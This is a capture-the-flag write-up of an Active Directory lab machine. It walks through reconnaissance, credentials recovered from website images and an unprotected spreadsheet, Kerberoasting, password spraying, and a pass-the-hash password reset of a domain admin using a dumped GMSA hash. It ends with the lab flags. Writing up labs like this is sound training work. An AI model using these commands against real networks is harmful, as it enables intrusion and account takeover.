# Lessons learned
- RUN HASHCAT WITHOUT RULES FIRST (or start with something small like best64). Don't start with OneRuletoRuleThemAll, it doesn't go through the rules in order as expected.
- If there's no other paths, squeeze all the info out of what you have (for example, can download all images from a site and exiftool, view them for passwords)

# Writeup 
## Recon

### rustscan

```
sudo rustscan -a <ip> | tee rustscan.txt
```

### nmapAutomator

```
sudo nmapAutomator.sh -H <ip> -t Recon 
```

## autorecon

```
sudo python3 autorecon.py -t targets.txt -v
```

ports
![](Pasted%20image%2020231017204137.png)
![](Pasted%20image%2020231017205031.png)
![](Pasted%20image%2020231017205044.png)

crackmapexec
![](Pasted%20image%2020231017211642.png)

kerbrute, found administrator, research users
![](Pasted%20image%2020231017214139.png)

osint?
![](Pasted%20image%2020231017214343.png)
![](Pasted%20image%2020231017214542.png)
from testimonial:
```
john.smith
christine.aguilar
robert.spears
bruce.rogers
```

more users found with kerbrute!
![](Pasted%20image%2020231017214634.png)

AT THIS POINT I looked up hints. I was kinda stuck after trying to spray passwords.
- ok, what i missed was more osint. i actually needed to grab the images to gather more info/creds.

download all images from site
```
wget -U "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0" -nd -r --level=1  -e robots=off -A jpg,jpeg -H http://research.search.htb
```

BRUH. this is dumb. `hope.sharp:IsolationIsKey?`
![](Pasted%20image%2020231017234751.png)

well. time to kerbrute. and password spray
![](Pasted%20image%2020231017235005.png)


## Initial Access
initial access!! `hope.sharp:IsolationIsKey?`
![](Pasted%20image%2020231017235045.png)

Kerberoasting web_svc
![](Pasted%20image%2020231017235225.png)

shares
![](Pasted%20image%2020231017235458.png)

GetADUsers
![](Pasted%20image%2020231017235645.png)

enumerating the shares, recursively
![](Pasted%20image%2020231018001337.png)

found sierra.frye `user.txt`, but can't open it?
![](Pasted%20image%2020231018001406.png)
![](Pasted%20image%2020231018001541.png)

After a little, web_svc is cracked! `web_svc:@3ONEmillionbaby`
![](Pasted%20image%2020231018011620.png)
spray on other users, get `Edgar.Jacobs:@3ONEmillionbaby`, has access to helpdesk share
![](Pasted%20image%2020231018011720.png)
![](Pasted%20image%2020231018011751.png)
![](Pasted%20image%2020231018011859.png)
but nothing in helpdesk share? 
![](Pasted%20image%2020231018012031.png)

but something in `RedirectedFolders$`, PhishingAttempt.xlsx?
![](Pasted%20image%2020231018012218.png)

protected sheet.
how to unprotect? 
1. rename the xlsx to zip
2. extract, then go to xl/worksheets/sheet2.xml
3. delete the sheetProtection xml tag
4. re-zip up everything with an archiver
5. then rename the .zip to .xls 
6. open the xls, now should be unprotected.
![](Pasted%20image%2020231018013946.png)

![](Pasted%20image%2020231018014321.png)
![](Pasted%20image%2020231018014353.png)
![](Pasted%20image%2020231018014409.png)
finally, with the workbook unprotected, expand the passwords column C
![](Pasted%20image%2020231018014537.png)

`sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18`, got user.txt!


## Privesc
bloodhound
```
bloodhound-python -u edgar.jacobs -p '@3ONEmillionbaby' -d search.htb -v --zip -c All -dc research.search.htb -ns 10.129.229.57
```
![](Pasted%20image%2020231018013808.png)

sierra.frye has the ability to dump the GMSA
![](Pasted%20image%2020231018015846.png)
pass the hash attack 
![](Pasted%20image%2020231018015854.png)

Abusing DACLs to ForceChangePassword domain admin (to "password") with pth tools
```sh
pth-net rpc password tristan.davies -U search.htb/'BIR-ADFS-GMSA$'%ffffffffffffffffffffffffffffffff:e1e9fd9e46d0d747e1595167eedcec0f -S research.search.htb  
```
![](Pasted%20image%2020231018020550.png)

PWNED!! impacket-wmiexec for interactive shell
![](Pasted%20image%2020231018021223.png)
![](Pasted%20image%2020231018021438.png)


## Loot
user.txt
```
0d9b97c61375bbfd19a9089dc8c04123
```
![](Pasted%20image%2020231018015238.png)

root.txt
```
98414e7f3570b49f22d528430e53f49c
```
![](Pasted%20image%2020231018021417.png)